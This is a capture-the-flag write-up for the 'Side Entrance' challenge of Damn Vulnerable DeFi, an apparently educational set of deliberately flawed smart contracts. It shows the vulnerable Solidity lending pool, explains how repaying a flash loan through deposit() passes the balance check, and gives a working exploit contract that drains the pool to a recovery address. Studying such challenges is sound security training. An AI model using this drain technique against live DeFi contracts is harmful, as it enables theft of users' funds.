## [Side Entrance](https://www.damnvulnerabledefi.xyz/challenges/side-entrance/)

> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
>
> It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
>
> Yoy start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
}
```

### Analysis

In this challenge, we need to drain all of the ETH from the contract `SideEntranceLenderPool`.

`SideEntranceLenderPool.flashLoan` verifies if the repayment is successful by checking `SideEntranceLenderPool.balance`. Additionally, we can use `SideEntranceLenderPool.deposit` to increase ``SideEntranceLenderPool.balance` while also increasing `SideEntranceLenderPool.balances[msg.sender]`, which we can withdraw later. Therefore, we can use the flash-loaned ETH to deposit it back into the pool, allowing us to pass the `if (address(this).balance < balanceBefore)` check in the `flashLoan` function. Then, we can withdraw the balance.

### Solution
Full solution can be found in [SideEntrance.t.sol](./SideEntrance.t.sol#L48).
```solidity
contract SideEntranceSolution {
    function go(SideEntranceLenderPool pool, address recovery) external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }
    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }
    receive() external payable {}
}
```